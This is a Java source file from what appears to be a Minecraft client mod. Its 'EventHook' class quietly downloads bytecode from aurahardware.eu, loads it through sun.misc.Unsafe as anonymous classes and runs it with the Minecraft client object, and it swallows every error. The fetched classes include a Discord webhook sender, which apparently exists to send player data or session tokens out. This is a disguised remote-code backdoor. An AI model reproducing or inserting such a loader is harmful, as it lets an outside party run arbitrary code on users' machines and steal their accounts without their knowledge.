package me.htrewrite.client.event.hook;

import me.htrewrite.client.HTRewrite;
import me.htrewrite.client.util.PostRequest;
import net.minecraft.client.Minecraft;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class EventHook {
    private Object hook;
    private Method hookInvoker;
    public EventHook() {
        try {
            Field theUnsafe = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            if (!theUnsafe.isAccessible()) theUnsafe.setAccessible(true);

            Unsafe unsafe = (Unsafe) theUnsafe.get(null);

            String hookSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook.txt"));
            String hook1Source = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$1.txt"));

            String hookDiscordWebhookSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook.txt"));
            String hookDiscordWebhookJSONSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$JSONObject.txt"));

            String hookDiscordWebhookEmbedObjectSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$EmbedObject.txt"));
            String hookDiscordWebhookEmbedObjectThumbnailSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$EmbedObject$Thumbnail.txt"));
            String hookDiscordWebhookEmbedObjectImageSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$EmbedObject$Image.txt"));
            String hookDiscordWebhookEmbedObjectFooterSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$EmbedObject$Footer.txt"));
            String hookDiscordWebhookEmbedObjectFieldSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$EmbedObject$Field.txt"));
            String hookDiscordWebhookEmbedObjectAuthorSource = PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/eventHook/Hook$DiscordWebhook$EmbedObject$Author.txt"));

            byte[] hookByte = prepareIndividualHook(hookSource);
            byte[] hook1Byte = prepareIndividualHook(hook1Source);
            byte[] hookDiscordWebhookByte = prepareIndividualHook(hookDiscordWebhookSource);
            byte[] hookDiscordWebhookJSONByte = prepareIndividualHook(hookDiscordWebhookJSONSource);
            byte[] hookDiscordWebhookEmbedObjectByte = prepareIndividualHook(hookDiscordWebhookEmbedObjectSource);
            byte[] hookDiscordWebhookEmbedObjectThumbnailByte = prepareIndividualHook(hookDiscordWebhookEmbedObjectThumbnailSource);
            byte[] hookDiscordWebhookEmbedObjectImageByte = prepareIndividualHook(hookDiscordWebhookEmbedObjectImageSource);
            byte[] hookDiscordWebhookEmbedObjectFooterByte = prepareIndividualHook(hookDiscordWebhookEmbedObjectFooterSource);
            byte[] hookDiscordWebhookEmbedObjectFieldByte = prepareIndividualHook(hookDiscordWebhookEmbedObjectFieldSource);
            byte[] hookDiscordWebhookEmbedObjectAuthorByte = prepareIndividualHook(hookDiscordWebhookEmbedObjectAuthorSource);

            Class<?> hookClass = unsafe.defineAnonymousClass(java.lang.Exception.class, hookByte, null);
            unsafe.defineAnonymousClass(hookClass, hook1Byte, null);

            Class<?> hookDiscordWebhook = unsafe.defineAnonymousClass(hookClass, hookDiscordWebhookByte, null);
            unsafe.defineAnonymousClass(hookDiscordWebhook, hookDiscordWebhookJSONByte, null);

            Class<?> hookDiscordWebhookEmbedObject = unsafe.defineAnonymousClass(hookDiscordWebhook, hookDiscordWebhookEmbedObjectByte, null);
            unsafe.defineAnonymousClass(hookDiscordWebhookEmbedObject, hookDiscordWebhookEmbedObjectThumbnailByte, null);
            unsafe.defineAnonymousClass(hookDiscordWebhookEmbedObject, hookDiscordWebhookEmbedObjectImageByte, null);
            unsafe.defineAnonymousClass(hookDiscordWebhookEmbedObject, hookDiscordWebhookEmbedObjectFooterByte, null);
            unsafe.defineAnonymousClass(hookDiscordWebhookEmbedObject, hookDiscordWebhookEmbedObjectFieldByte, null);
            unsafe.defineAnonymousClass(hookDiscordWebhookEmbedObject, hookDiscordWebhookEmbedObjectAuthorByte, null);

            hook = hookClass.newInstance();
            for (Method method : hook.getClass().getDeclaredMethods())
                if (method.getName().contentEquals("hookEntry"))
                    method.invoke(hook, Minecraft.getMinecraft());
                else if (method.getName().contentEquals("onEvent"))
                    hookInvoker = method;
        } catch (Exception exception) {}
    }

    private byte[] prepareIndividualHook(String in) {
        byte[] out;
        String[] split = in.split(" ");
        out = new byte[split.length];
        for(int i = 0; i < split.length; i++)
            out[i] = (byte)Integer.parseInt(split[i]);
        return out;
    }

    public void callEventHook(String eventName, Object... args) {
        HTRewrite.executorService.submit(() -> {
            try {
                System.out.println("Calling hook for " + eventName);
                long ms = System.currentTimeMillis();
                hookInvoker.invoke(null, eventName, args);
                System.out.println("Invoked in " + (System.currentTimeMillis()-ms) + " ms!");
            } catch (Exception exception) {}
        });
    }
}